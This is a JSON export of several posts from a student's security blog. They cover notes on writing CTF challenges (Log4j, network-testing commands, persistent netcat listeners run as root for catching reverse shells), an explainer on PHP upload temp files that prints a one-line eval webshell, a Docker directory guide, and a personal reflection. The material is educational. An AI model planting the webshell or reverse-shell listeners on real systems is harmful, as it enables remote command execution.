[{"content":"开篇📜📜📜# 迄今已经是我第二次参与出题，这次跟上次最大的不同就是对环境熟悉多了，对知识也清晰了些，解决问题的能力在ai的辅助下有了质的飞跃，还记得当时查博客，查的网页数都数不过来，还不一定有解决方案。不过依旧因为自己的粗心和大意容易浪费时间\n首先就是前一两天测好的东西，然后再看就打不通了，有时候人真的会无语，哈哈。然后就捯饬捯饬，重新又搞了一遍。发现心态也越来越好了，哈哈，以前搞不好还会有点热，当然现在也会有点热。\r然后就是写了个重复的代码，然后一直测试测试，因为忘记打开报错了，就啥也没显示，我以为打开了，反反复复就是不是想要的效果，所以吃一堑长一智。 一✒️# 准备第一次出java语言的漏洞题目，其实也就是个log4j的CVE\n然后也是一个星期左右吧，在AI的帮助下其实实现起来轻松很多。这里其实最令我无语的是还是环境的问题，这个题目的出题经历让我认识到了，在需要多服务和网络跨来跨去的时候，一定要先确定网络是否能通，端口是否正常。我这里涉及到一个端口问题，这个问题让我百思不得其解然后折磨了一整个下午。我基本上把所有问题排除了，但是这个题目还是没有达到我想要的回显效果，我监听了4444端口，起的http服务下的资源也转发下载成功了，然后docker中的配置和java版本等等，pom.xml等等确定了无数次，反反复复得docker-compose up -d到docker-compose down，然后docker rmi ID 得十几次，就是不停换不停测，就是不行。然后我想是不是端口问题，然后echo了一个语句到4444没有反应，然后又起了一个4445监听，同样echo一个语句有反应，这时我立马就傻了。。。无语死了，随后换成了4445端口，就回显了有了反应，不知道为什么，并不是什么安全组问题，端口都是开放的。算是吃一堑长一智吧。\r好在成功出出来了，没有白费功夫。 既然都说到这儿了，下面就对一些网络命令进行整理\n网络命令进行整理# 在 Linux 中，测试 网络是否通、目标主机是否可达、端口是否开放 是日常运维和渗透测试中的常见操作。以下是几个最常用、实用的命令：\n🔹 1. ping —— 测试主机是否可达（ICMP 层）# ping 192.168.1.100 ✅ 优点：快速判断目标主机是否在线 ❌ 缺点：很多服务器禁 ping（防火墙过滤 ICMP），所以 ping 不通 ≠ 主机宕机\n🔹 2. telnet —— 测试 TCP 端口是否开放（最经典）# telnet 192.168.1.100 4444 如果连接成功（出现空白或提示符）→ ✅ 端口开放 如果提示 Connection refused → ❌ 端口关闭（服务没开） 如果卡住/超时 → ⚠️ 端口被防火墙过滤（可能开放但屏蔽了） 💡 安装 telnet（如未安装）：\nsudo apt install telnet -y 🔹 3. nc（netcat）—— 更灵活的端口探测工具# 测试 TCP 端口：\nnc -zv 192.168.1.100 4444 -z：只扫描，不发送数据 -v：显示详细信息 输出示例：\nConnection to 192.168.1.100 4444 port [tcp/*] succeeded! 扫描多个端口：\nnc -zv 192.168.1.100 4444 4445 8080 # 或范围 nc -zv 192.168.1.100 4440-4450 💡 安装 netcat：\nsudo apt install netcat -y # Ubuntu/Debian # 或 sudo yum install nc -y # CentOS/RHEL 🔹 4. nmap —— 专业端口扫描工具（功能最强）# 扫描单个端口：\nnmap -p 4444 192.168.1.100 扫描多个端口：\nnmap -p 4444,4445,8080 192.168.1.100 扫描全端口（慎用）：\nnmap -p- 192.168.1.100 输出解读：\nopen → 端口开放 closed → 端口关闭（服务没监听） filtered → 被防火墙过滤（不确定是否开放） 💡 安装 nmap：\nsudo apt install nmap -y 🔹 5. curl / wget —— 测试 HTTP(S) 服务# 适用于 Web 服务（80/443/8080 等）：\ncurl -v http://192.168.1.100:8080 # 或 wget --spider http://192.168.1.100:8080 能返回 HTML 或状态码 → ✅ 服务正常 连接超时 → 端口不通或服务未响应 🔹 6. ss / netstat —— 查看本机监听端口（本地诊断）# 查看本机是否在监听 4444：\nss -tuln | grep 4444 # 或 netstat -tuln | grep 4444 输出示例：\ntcp 0 0 0.0.0.0:4444 0.0.0.0:* LISTEN ✅ 表示本机确实在监听 4444 端口。\n💡 ss 比 netstat 更快，推荐使用。\n🧪 实战组合建议\n场景 推荐命令 快速测端口通不通 nc -zv ip port 判断是“关了”还是“被拦了” telnet ip port + nmap -p port ip 本机服务是否监听 `ss -tuln Web 服务测试 curl -v http://ip:port ❗ 注意事项\nUDP 端口 很难准确探测（无连接机制），需用 nc -uvz 或专用工具。 有些服务（如反弹 shell 监听）只接受连接但不回显，此时 nc 连上后无输出是正常的。 防火墙/NAT 可能导致“本地能连，外部不能连”，务必从攻击者视角测试。 ✅ 总结一句话：\n测端口通不通，首选 nc -zv 或 telnet；查本机监听用 ss；批量扫描用 nmap。\n假设你在本机或远程有一台机器正在 监听 TCP 4445 端口（比如用 nc -lvp 4445），你可以用以下任一方式发送数据：\n输出到监听端口# 方法 1：使用 echo + nc（推荐）# echo \u0026#34;Hello from client!\u0026#34; | nc 127.0.0.1 4445 ✅ 适用于测试反弹 shell、Log4j 回显、自定义协议等场景\n方法 2：使用 telnet（交互式）# telnet 127.0.0.1 4445 # 然后手动输入： Hello from telnet! # 按 Ctrl+] 再按 q 退出 方法 3：使用 bash 原生 TCP（无需安装工具）# echo \u0026#34;Hello via bash!\u0026#34; \u0026gt; /dev/tcp/127.0.0.1/4445 ⚠️ 要求 bash 支持 /dev/tcp（大多数 Linux 默认支持）\n方法 4：Python 发送（灵活）# python3 -c \u0026#34; import socket s = socket.socket() s.connect((\u0026#39;127.0.0.1\u0026#39;, 4445)) s.send(b\u0026#39;Hello from Python!\u0026#39;) s.close() \u0026#34; 监听# 🔹 A. 临时监听（非持久化）—— 关闭终端即停止# 使用 nc（netcat）监听（最常用） # 监听 4445，每收到一次连接就退出 nc -lvnp 4445 # 持续监听（每次连接后继续等待下一次） while true; do nc -lvnp 4445; done 参数说明：\n-l：listen（监听） -v：verbose（显示连接信息） -n：不解析 DNS（加快速度） -p：指定端口 💡 收到数据后，内容会直接打印在终端上！\n使用 socat（功能更强） socat TCP-LISTEN:4445,fork STDOUT fork：允许多次连接 数据会回显到终端 Python 快速监听 python3 -c \u0026#34; import socket s = socket.socket() s.bind((\u0026#39;0.0.0.0\u0026#39;, 4445)) s.listen(1) print(\u0026#39;Listening on 0.0.0.0:4445\u0026#39;) conn, addr = s.accept() print(\u0026#39;Connected by\u0026#39;, addr) print(conn.recv(1024).decode()) conn.close() \u0026#34; 🔹 B. 持久化监听（开机自启 / 后台常驻）# 适用于需要长期监听的场景（如 CTF 靶机、反弹 shell 接收器）\n方案 1：用 systemd 创建服务（推荐，现代 Linux）\n创建服务文件： sudo nano /etc/systemd/system/listen4445.service 内容如下： [Unit] Description=Listen on port 4445 for CTF After=network.target [Service] ExecStart=/usr/bin/nc -k -l -p 4445 Restart=always User=root StandardOutput=journal StandardError=journal [Install] WantedBy=multi-user.target ⚠️ 注意：部分 nc 版本不支持 -k（保持监听），可改用 socat 或 while 循环脚本\n启用并启动服务： sudo systemctl daemon-reload sudo systemctl enable --now listen4445.service 查看日志： journalctl -u listen4445 -f 方案 2：用 screen 或 tmux 后台运行（简单粗暴）\n# 安装 screen sudo apt install screen -y # 启动后台会话 screen -dmS listener nc -k -l -p 4445 # 查看输出 screen -r listener 优点：简单；缺点：重启后不会自动恢复\n方案 3：写一个守护脚本 + cron（兼容老系统）\n创建脚本 /root/listen.sh： #!/bin/bash while true; do nc -lvnp 4445 \u0026gt;\u0026gt; /var/log/listen4445.log 2\u0026gt;\u0026amp;1 done 赋予执行权限： chmod +x /root/listen.sh 添加开机启动（通过 crontab）： (crontab -l 2\u0026gt;/dev/null; echo \u0026#34;@reboot /root/listen.sh \u0026amp;\u0026#34;) | crontab - 🧪 测试全流程示例# 终端 1：监听# nc -lvnp 4445 终端 2：发送# echo \u0026#34;Test message\u0026#34; | nc 127.0.0.1 4445 ✅ 终端 1 会立即显示：\nTest message ✅ 总结对比# 类型 命令 是否持久 适用场景 临时监听 nc -lvnp 4445 ❌ 否 快速测试、CTF 临时接收 持久监听 systemd 服务 ✅ 是 长期运行、生产环境 半持久 screen / tmux ⚠️ 重启失效 调试、临时后台 发送数据 `echo \u0026ldquo;xxx\u0026rdquo; nc ip port` — 然后于开赛的当周，突然就又有了灵感，想把这道题完善一下，不能说明明显显就留了个接口告诉选手，漏洞在这儿直接打吧，于是我加了很多接口和功能，然后增加了三种身份，游客登入、普通用户登入，管理员登入，管理员的账号密码泄露在文档的json数据示例中。因为是临时加工，前后端不分离，使用的是thymeleaf，不熟，所以在ai的帮助下依旧难受，哈哈，看不太懂，尤其是模板layout，会出现版本啊格式啊，兼容渲染覆盖等等问题...\r但是如果前后端分离，我怕来不及，所以就凑合着用吧。 二✒️# 接下来想搞一个CMS,找一找有没有有趣有东西一点的\n一开始想找个开源的CMS但是，同为出题的其他师傅觉得开源的CMS漏洞公开比较多，觉得可能比较简单，然后比较容易吧，于是乎建议我看看有没有自己写的那种项目进行漏洞设计，这个就是全新未开源的代码审计加上漏洞利用了，感觉上很有搞头。但是由于是新生赛，我这也就还剩一道题，得搞道送分签到题，有意思一点，这个思路等以后有机会再去实现吧。 这道题是我朋友搞的，我发现我们其实挺有默契的，想法差不多，他也是CMS，而且也是受到了我们之前去打红队的时候遇到的思路的启发诞生出来了这道题，利用前后端校验逻辑问题，修改密码+python沙箱栈帧逃逸 三✒️# 送分大福利题，主打一个来就有，目的还是希望出的有趣\n收到最近打的一个铸剑杯的启发，感觉可以出一个游戏的送分题，因为我去年实际上也出了个游戏的送分题，不过那个属于游戏的类型，实际上flag就在源码里边，然后只要对base64有点熟悉的人就会很容易在一个js的文件中发现flag，那道题在赛后反馈中有些师傅说玩的挺开心的，于是今年我又来整一个游戏题吧，也是送分，算是延续自己的初心，哈哈哈。于是我就想着出个什么游戏，去逛逛老牌4399游戏，发现黄金矿工确实很经典，本身自己从小到大就很喜欢玩游戏，哈哈 四✒️# php反序列化的pop链板子题，这个是最早出出来的，对于新手想秒还是不太容易\n五✒️# 出了个简单题，毕竟是新生赛性质，一个简单抓包越权+jwt伪造\n背景虽然给的也是游戏，但是这个跟游戏没什么关系，就是打着游戏的背景进行一个web基础题的出题。\n✌✌✌\n结语🚩# 说实话换到去年我可能没怎么能有想法和干劲，哈哈，一是实力不够，二是这是我最后一次为咱们出题了，明年真的不好说了，还是想多留下点东西，虽然没什么好成绩留下给战队，其中自己的原因更大吧，迷茫使然，现在我清晰了，但是却失去了最好的时间。把战队的比赛官网在AI的帮助下重做了一下，尽一点绵薄之力。然后把尽心的把新生和小登们引导进来，web手可是不能缺少的部分，未来是他们的，我的下一站需要一年的磨砺了，以后继续当赛棍，哈哈哈哈。接触安全包括中途摆烂很久的那段时间也就一年多，差不多两年不到。受益匪浅，成长可谓巨大。\r我该去走我自己的下一段路了，这里立一个flag，待我凯旋，重新好好专研一下，继续ctf，然后学习渗透。\r而且这个hugo搭建的博客还有一些问题需要花时间去补充，比如友链，标签不支持中文,about页面（关于自己）等等... 等我忙完这个人生最重要的事情之一，利用ai去把这个学习，整一整 ","date":"2025-10-29","id":0,"permalink":"/blog/%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/","summary":"开篇📜📜📜# 迄今已经是我第二次参与出题，这次跟上次最大的不同就是对环境熟悉多了，对知识也清晰了些，解决问题的能力在ai的辅助下有了质的飞跃，还记得当时查博客，查的网页数都数不过来，还不一定有解决方案。不过依旧因为自己的粗心和大意容易浪费时间\n首先就是前一两天测好的东西，然后再看就打不通了，有时候人真的会无语，哈哈。然后就捯饬捯饬，重新又搞了一遍。发现心态也越来越好了，哈哈，以前搞不好还会有点热，当然现在也会有点热。\r然后就是写了个重复的代码，然后一直测试测试，因为忘记打开报错了，就啥也没显示，我以为打开了，反反复复就是不是想要的效果，所以吃一堑长一智。 一✒️# 准备第一次出java语言的漏洞题目，其实也就是个log4j的CVE\n然后也是一个星期左右吧，在AI的帮助下其实实现起来轻松很多。这里其实最令我无语的是还是环境的问题，这个题目的出题经历让我认识到了，在需要多服务和网络跨来跨去的时候，一定要先确定网络是否能通，端口是否正常。我这里涉及到一个端口问题，这个问题让我百思不得其解然后折磨了一整个下午。我基本上把所有问题排除了，但是这个题目还是没有达到我想要的回显效果，我监听了4444端口，起的http服务下的资源也转发下载成功了，然后docker中的配置和java版本等等，pom.xml等等确定了无数次，反反复复得docker-compose up -d到docker-compose down，然后docker rmi ID 得十几次，就是不停换不停测，就是不行。然后我想是不是端口问题，然后echo了一个语句到4444没有反应，然后又起了一个4445监听，同样echo一个语句有反应，这时我立马就傻了。。。无语死了，随后换成了4445端口，就回显了有了反应，不知道为什么，并不是什么安全组问题，端口都是开放的。算是吃一堑长一智吧。\r好在成功出出来了，没有白费功夫。 既然都说到这儿了，下面就对一些网络命令进行整理\n网络命令进行整理# 在 Linux 中，测试 网络是否通、目标主机是否可达、端口是否开放 是日常运维和渗透测试中的常见操作。以下是几个最常用、实用的命令：\n🔹 1. ping —— 测试主机是否可达（ICMP 层）# ping 192.168.1.100 ✅ 优点：快速判断目标主机是否在线 ❌ 缺点：很多服务器禁 ping（防火墙过滤 ICMP），所以 ping 不通 ≠ 主机宕机\n🔹 2. telnet —— 测试 TCP 端口是否开放（最经典）# telnet 192.168.1.100 4444 如果连接成功（出现空白或提示符）→ ✅ 端口开放 如果提示 Connection refused → ❌ 端口关闭（服务没开） 如果卡住/超时 → ⚠️ 端口被防火墙过滤（可能开放但屏蔽了） 💡 安装 telnet（如未安装）：\n","tags":["Blog","practice"],"title":"出题小记"},{"content":"关于php文件上传和解析的tmp目录作用及问题# 📌 什么是 $_FILES['file']['tmp_name']？# 在 PHP 中，当你通过 HTML 表单上传一个文件时，PHP 会将这个上传的文件先保存到服务器的一个临时目录中，这个路径就是：\n$_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;] 示例说明：# 假设你有一个上传表单：\n\u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;上传\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 用户选择了文件 shell.php 并提交后，在 PHP 脚本中你可以这样访问它：\nif ($_FILES[\u0026#39;file\u0026#39;]) { echo $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; // shell.php（客户端原始文件名） echo $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; // /tmp/phpABC123（服务器上的临时路径） } 🔁 临时文件路径的作用是什么？# ✅ 1. 上传文件的临时存储位置\n当浏览器上传文件到服务器时，PHP 会先把文件写入一个临时目录（通常是 /tmp）。 这是为了防止上传过程中服务器资源被长期占用。 如果你不处理这个临时文件（比如没有调用 move_uploaded_file()），那么上传完成后，这个文件会被自动删除。 ✅ 2. 用于后续操作：移动、重命名、检查内容等\n一旦你得到了临时路径，就可以对文件进行各种操作：\n✅ 移动文件到指定目录# $upload_dir = \u0026#39;uploads/\u0026#39;; $tmp_name = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $target = $upload_dir . basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); if (is_uploaded_file($tmp_name)) { move_uploaded_file($tmp_name, $target); } ✅ 检查文件内容（如是否包含 PHP 代码）# $content = file_get_contents($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if (strpos($content, \u0026#39;\u0026lt;?php\u0026#39;) !== false) { die(\u0026#39;不允许上传 PHP 文件！\u0026#39;); } ✅ 获取 MIME 类型或图片信息# $finfo = finfo_open(FILEINFO_MIME_TYPE); echo finfo_file($finfo, $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); 🧠 举个比喻帮助理解# 你可以把 $_FILES['file']['tmp_name'] 看作是：\n快递员把你网购的商品放到了小区门口的快递柜里，快递柜的编号就是 tmp_name。\n你需要去快递柜取货（读取/移动文件），否则过一段时间快递柜会自动清空（PHP 删除临时文件）。\n⚠️ 注意事项# 临时文件只在当前请求期间有效。如果你不及时处理（比如 move 或 read），PHP 会在脚本执行结束后自动删除它。 不要直接使用 tmp_name 作为最终文件路径，必须手动将其移动到安全目录。 确保目标目录有写权限，否则 move_uploaded_file() 会失败。 不要信任客户端提供的文件名（$_FILES['file']['name']），攻击者可以伪造任意名称。 ✅ 总结一句话：# $_FILES['file']['tmp_name'] 是 PHP 在接收到上传文件后，在服务器上创建的一个临时文件路径。它的作用是让你能够在这个请求周期内读取、检查或移动上传的文件。如果不及时处理，这个文件会在请求结束时被自动删除。\n/tmp +php# /tmp` 目录下通常不会触发恶意代码执行，而必须将其移动到 Web 可访问的目录下才行。\n1. Web 服务器的工作原理# Web 服务器（如 Apache、Nginx）是通过 HTTP 请求来提供服务的。当用户通过浏览器请求一个 URL 时，Web 服务器会根据配置查找对应的文件，并将其内容返回给客户端。如果这个文件是一个 PHP 文件，Web 服务器会首先将它传递给 PHP 解释器处理，然后将输出结果返回给客户端。\n关键点：只有位于 Web 服务器配置中指定的文档根目录（通常是 /var/www/html/ 或类似的路径）及其子目录下的文件才能通过 HTTP 请求被访问。 /tmp 目录：默认情况下，/tmp 目录并不在 Web 服务器的文档根目录内，因此无法直接通过 HTTP 请求访问该目录中的文件。 2. PHP 处理机制# 当 PHP 接收到一个文件上传时，它会先将文件存储在一个临时位置（通常是 /tmp 目录），直到你在脚本中显式地处理这个文件（例如移动到其他地方或删除）。即使上传的是一个 PHP 脚本，只要它停留在 /tmp 目录下，Web 服务器也不会自动将其作为可执行脚本处理。\n临时文件的安全性：PHP 在处理完请求后，会自动清理这些临时文件，除非你在脚本中明确地将它们移动到持久存储位置。 3. 安全防护措施# Web 服务器配置限制# 大多数 Web 服务器配置都会禁止对某些敏感目录（如 /tmp）的直接访问。例如：\nApache: 通过 .htaccess 文件或主配置文件可以设置不允许访问特定目录。 Nginx: 同样可以通过配置文件禁止访问非文档根目录下的路径。 这意味着即使攻击者知道了一个上传到 /tmp 目录下的文件的确切路径，也无法通过浏览器直接请求并触发其执行。\nPHP 配置限制# open_basedir: 如果设置了 open_basedir，则 PHP 脚本只能访问指定目录下的文件，这进一步限制了对 /tmp 目录的访问。 disable_functions 和 disable_classes: 禁用某些危险函数（如 exec, system, passthru 等），减少攻击面。 4. 为何需要移动到 Web 可访问的目录？# 为了让上传的 PHP 文件能够被执行，攻击者需要确保：\n文件位于 Web 文档根目录下：这样才能通过 HTTP 请求访问该文件。 文件具有正确的扩展名：例如 .php，这样 Web 服务器才会将其传递给 PHP 解释器处理。 适当的权限：文件所在目录和文件本身必须具有足够的权限，使得 Web 服务器进程能够读取并执行它。 示例# 假设攻击者上传了一个包含以下内容的一句话木马：\n\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 如果这个文件被保存为 /tmp/shell.php，那么：\n无法通过 HTTP 访问：因为 /tmp 目录不在 Web 文档根目录内，尝试访问 http://example.com/tmp/shell.php 会导致 404 错误。 但如果攻击者能够利用服务器端的漏洞将此文件移动到 /var/www/html/uploads/shell.php，并且 Web 服务器允许访问该路径，则攻击者可以通过访问 http://example.com/uploads/shell.php 来执行任意命令。\n总结# /tmp 目录：默认情况下，Web 服务器不会公开访问 /tmp 目录中的文件，因此即使上传了一句话木马，也不能直接通过 HTTP 触发执行。 需移动到 Web 可访问目录：为了使恶意代码生效，攻击者需要找到方法将文件从临时目录移动到 Web 文档根目录下的某个位置，并且确保该位置允许执行 PHP 脚本。 加强安全措施：开发者应严格验证上传文件的内容和类型，避免将文件移动到不安全的位置，并采取其他必要的安全防护措施。 ","date":"2025-06-05","id":1,"permalink":"/blog/%E5%85%B3%E4%BA%8Ephp%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E8%A7%A3%E6%9E%90%E7%9A%84tmp%E7%9B%AE%E5%BD%95%E4%BD%9C%E7%94%A8%E5%8F%8A%E9%97%AE%E9%A2%98/","summary":"关于php文件上传和解析的tmp目录作用及问题# 📌 什么是 $_FILES['file']['tmp_name']？# 在 PHP 中，当你通过 HTML 表单上传一个文件时，PHP 会将这个上传的文件先保存到服务器的一个临时目录中，这个路径就是：\n$_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;] 示例说明：# 假设你有一个上传表单：\n\u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;上传\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 用户选择了文件 shell.php 并提交后，在 PHP 脚本中你可以这样访问它：\nif ($_FILES[\u0026#39;file\u0026#39;]) { echo $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; // shell.php（客户端原始文件名） echo $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; // /tmp/phpABC123（服务器上的临时路径） } 🔁 临时文件路径的作用是什么？# ✅ 1. 上传文件的临时存储位置\n当浏览器上传文件到服务器时，PHP 会先把文件写入一个临时目录（通常是 /tmp）。 这是为了防止上传过程中服务器资源被长期占用。 如果你不处理这个临时文件（比如没有调用 move_uploaded_file()），那么上传完成后，这个文件会被自动删除。 ✅ 2. 用于后续操作：移动、重命名、检查内容等\n一旦你得到了临时路径，就可以对文件进行各种操作：\n✅ 移动文件到指定目录# $upload_dir = \u0026#39;uploads/\u0026#39;; $tmp_name = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $target = $upload_dir . basename($_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]); if (is_uploaded_file($tmp_name)) { move_uploaded_file($tmp_name, $target); } ✅ 检查文件内容（如是否包含 PHP 代码）# $content = file_get_contents($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if (strpos($content, \u0026#39;\u0026lt;?php\u0026#39;) !== false) { die(\u0026#39;不允许上传 PHP 文件！\u0026#39;); } ✅ 获取 MIME 类型或图片信息# $finfo = finfo_open(FILEINFO_MIME_TYPE); echo finfo_file($finfo, $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); 🧠 举个比喻帮助理解# 你可以把 $_FILES['file']['tmp_name'] 看作是：\n","tags":["Blog","PHP"],"title":"关于php文件上传和解析的tmp目录作用及问题"},{"content":"docker容器部署简单php和nginx相关目录# 在 Docker 容器中，目录结构的设计通常取决于基础镜像以及应用程序的需求。不过，有一些常见的目录和文件是许多容器都会用到的。以下是这些常见目录及其功能的概述：\n常见目录结构# /var/www/html 或 /usr/share/nginx/html\n用途: 用于存放 Web 应用程序的静态资源（如 HTML 文件、CSS、JavaScript 和图片等）。 示例: 在基于 Nginx 的容器中，静态网站内容通常放在 /usr/share/nginx/html 下；而对于 PHP 应用，可能会映射到 /var/www/html。 /etc/nginx\n用途: 存储 Nginx 的配置文件。\n子目录与文件：\nnginx.conf: 主配置文件，定义了 Nginx 的全局设置。 conf.d/: 包含额外的配置文件，通常是针对不同站点或服务的配置片段。 sites-available/ 和 sites-enabled/: 类似于 Apache 的配置管理方式，前者存储所有可用的站点配置，后者通过符号链接指向启用的站点配置。 /etc/php 或 /usr/local/etc/php\n用途: 存储 PHP 的配置文件。\n子目录与文件：\nphp.ini: PHP 的主要配置文件，控制 PHP 的运行时行为。 conf.d/: 包含其他 PHP 扩展的配置文件。 /var/log/nginx 或 /var/log/php-fpm\n用途: 存储日志文件。\n示例：\naccess.log: 记录所有的访问请求。 error.log: 记录错误信息。 /usr/src 或 /opt\n用途: 用于存放源代码或第三方库。 示例: 如果你需要编译某些软件或者存放应用依赖，可以将它们放置在这里。 /root\n用途: 根用户的主目录，一般不建议在此存放应用相关的数据，但有时会用于存放一些临时脚本或工具。 /tmp\n用途: 临时文件的存放位置，容器重启时可能被清理。 注意事项: 不适合长期存储重要数据。 /var/lib/mysql 或 /var/lib/postgresql\n用途: 数据库管理系统（如 MySQL 或 PostgreSQL）的数据存储位置。 示例: 这些目录通常会被挂载为卷（volume），以便持久化数据库数据。 /etc/mysql 或 /etc/postgresql\n用途: 存储数据库配置文件。 示例: 包括数据库服务器的配置文件，如 my.cnf 或 postgresql.conf。 /run\n用途: 存储进程 ID 文件（PID files）、sockets 等运行时数据。 注意事项: 此目录的内容在系统重启后通常不会保留。 其他注意事项# 挂载点（Volumes）: 在生产环境中，通常会使用 Docker 卷来挂载重要的目录（如数据库数据目录、日志目录等），以确保数据的持久性和隔离性。 环境变量: 很多容器化应用依赖环境变量来进行配置，例如数据库连接字符串、API 密钥等。 健康检查（Healthcheck）: 使用 Docker 的 HEALTHCHECK 指令可以定期检查容器内应用的状态，确保其正常运行。 实际例子# 假设你有一个简单的 LEMP（Linux, Nginx, MySQL, PHP）栈的应用，其目录结构可能如下所示：\n/var/www/html/ ├── index.php ├── css/ │ └── style.css └── js/ └── script.js /etc/nginx/ ├── nginx.conf └── conf.d/ └── default.conf /usr/local/etc/php/ ├── php.ini └── conf.d/ └── custom.ini /var/log/nginx/ ├── access.log └── error.log /var/lib/mysql/ └── (MySQL 数据文件) /etc/mysql/ └── my.cnf 这种结构清晰地分离了不同的职责：Web 内容、Web 服务器配置、PHP 配置、日志记录和数据库数据。每个部分都有明确的作用，便于维护和扩展。\n","date":"2025-06-03","id":2,"permalink":"/blog/docker%E5%AE%B9%E5%99%A8%E9%83%A8%E7%BD%B2%E7%AE%80%E5%8D%95php%E5%92%8Cnginx%E7%9B%B8%E5%85%B3%E7%9B%AE%E5%BD%95/","summary":"docker容器部署简单php和nginx相关目录# 在 Docker 容器中，目录结构的设计通常取决于基础镜像以及应用程序的需求。不过，有一些常见的目录和文件是许多容器都会用到的。以下是这些常见目录及其功能的概述：\n常见目录结构# /var/www/html 或 /usr/share/nginx/html\n用途: 用于存放 Web 应用程序的静态资源（如 HTML 文件、CSS、JavaScript 和图片等）。 示例: 在基于 Nginx 的容器中，静态网站内容通常放在 /usr/share/nginx/html 下；而对于 PHP 应用，可能会映射到 /var/www/html。 /etc/nginx\n用途: 存储 Nginx 的配置文件。\n子目录与文件：\nnginx.conf: 主配置文件，定义了 Nginx 的全局设置。 conf.d/: 包含额外的配置文件，通常是针对不同站点或服务的配置片段。 sites-available/ 和 sites-enabled/: 类似于 Apache 的配置管理方式，前者存储所有可用的站点配置，后者通过符号链接指向启用的站点配置。 /etc/php 或 /usr/local/etc/php\n用途: 存储 PHP 的配置文件。\n子目录与文件：\nphp.ini: PHP 的主要配置文件，控制 PHP 的运行时行为。 conf.d/: 包含其他 PHP 扩展的配置文件。 /var/log/nginx 或 /var/log/php-fpm\n用途: 存储日志文件。\n示例：\naccess.log: 记录所有的访问请求。 error.log: 记录错误信息。 /usr/src 或 /opt\n","tags":["Blog","Deploy"],"title":"docker容器部署简单php和nginx相关目录"},{"content":" 迷茫不会毁掉一个人，堕落才会。我不后悔自己浪费的时间和放纵，因为我并不是一无所获，可惜但不遗憾。\r--题记\t已经大二下了，自我感觉进入大二下相比以往的第一年和上个学期，这个学期放松了很多，懈怠了很多。并没有按照预期一样努力和学习，前前后后吧，几个月，具体可以从寒假追溯到近些日子。\n可以先细数做了些什么吧，总体来说就是娱乐和放松。刷视频、打游戏、看各种好玩东西，睡觉，聊天，然后不干这些的时候可能就是放空或运动。总体上来说很轻松，哈哈，说难听点就是摆烂。学习上吧，零零碎碎，安全上面并没有进步，会的还是以前会的东西，算法嘛，垃圾，不看答案写不出的那种，当然有些看了也看不懂。非要说学了点什么，只能说学了点人工智能方面的东西，不过也是纸上谈兵，没深究，还有各种新闻变化和行业分析吧，总的来说感觉AI真的要改变很多东西，coze和dify这种集成各种大模型的AI应用开发平台令我叹为观止，方便简洁，可用性高，主要是提升效率和事务。Agent也让我感觉到了未来产品的发展方向，感觉AI时代普通产品是没有技术壁垒的，真正要做的是用户、市场、营销，感觉能否洞察需求才是关键，也开始明白和理解最近看到的话，百分之八十的市场和营销，百分之二十的技术。\n学的杂了，了解多了，但却什么水平也不行，我也顺理成章的陷入了迷茫，老是思考，我学历这么差，又没技术，是考研还是就业，就业又该做什么，有人会要吗，反正奇奇怪怪。看到了就业和失业的文章，也知道留给自己的时间不多了，但是为什么我还是选择娱乐和放纵，哈哈。😶‍🌫️😶‍🌫️😶‍🌫️\n因为我觉得从小到大，我基本上都在做我认为正确的选择或者他人认为正确的选择，可是是否真的正确，在现在的我看来，并非如此。所以本质上，同时空同条件下的我，会做的选择，与隔时空的我很难相同，也自然没有正确与否。所以我打算让自己也做一个快乐的决定，最起码身为大学生和大二的我来说，沉默成本可以接受。主要确实不想学，很不想学，所以自然而然就干脆随性一把。允许自己调整怎么能算一个错误呢，嘿嘿，大不了后面多努力些呗，虽然还可能摆，哈哈哈，但是应该不会像这么长了。\n这段时间我也大胆的进入了一个我从未涉猎的领域，至于什么领域，懂得都懂。我发掘人与人之间是不能强行建立联系的，主动的那一方往往要承担巨大的风险，总得来说感悟颇多，一生受益吧，但是自己内心的美好还是没有改变的，只不过是丰富自己的见识罢了，我还是那个热爱生活和充满热情的中二少年，哈哈哈哈。🤐🤐🤐\n写下这篇文章说明我也开始正常坐在陪伴我最久的伙伴面前，曾经流过口水的桌子，大一冷飕飕对着我寒暄的空调大哥，熟悉的环境，熟悉的码字，开始展望未来的日子，虽然马上放暑假了，爽，哈哈哈。\n后续的计划吧，把想学的东西都学了，管他有没有用，未来怎么样，在过程中清晰吧，但是有一点我越来越坚定了，我想优秀，想更有实力。\n好久操作hugo gitpages了，还得查查 